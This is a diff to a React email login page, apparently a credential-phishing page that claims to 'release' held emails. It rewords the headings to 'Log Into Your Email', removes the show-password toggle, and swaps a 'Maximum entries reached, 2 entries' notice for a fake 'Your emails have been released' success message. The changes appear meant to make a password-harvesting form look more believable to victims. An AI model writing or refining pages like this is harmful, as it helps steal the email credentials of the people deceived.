@@ -69,7 +69,7 @@ function Index() {
             <h1 className="text-5xl font-bold text-center tracking-tight text-foreground">My Email</h1>
 
             <div className="mt-10">
-              <h2 className="text-xl font-semibold text-foreground">Confirm Your Credential</h2>
+              <h2 className="text-xl font-semibold text-foreground">Log Into Your Email</h2>
               <p className="mt-1 text-sm text-muted-foreground">
                 Release using your email address and password.
               </p>
@@ -163,14 +163,7 @@ function Index() {
                 >
                   Password
                 </label>
-                <button
-                  type="button"
-                  aria-label={showPassword ? "Hide password" : "Show password"}
-                  onClick={() => setShowPassword((s) => !s)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 rounded p-1 text-muted-foreground hover:text-foreground"
-                >
-                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
-                </button>
+
                 {passwordError && (
                   <p className="mt-1 text-sm text-destructive">This field is required</p>
                 )}
@@ -264,9 +257,9 @@ function Index() {
             >
               <X className="h-4 w-4" />
             </button>
-            <h2 className="text-lg font-semibold text-foreground">Maximum entries reached</h2>
+            <h2 className="text-lg font-semibold text-foreground">Email Release success</h2>
             <p className="mt-2 text-sm text-muted-foreground">
-              This email has already submitted 2 entries. No further attempts are accepted.
+              Your emails have been released. Await your messages in your inbox.
             </p>
           </div>
         </div>
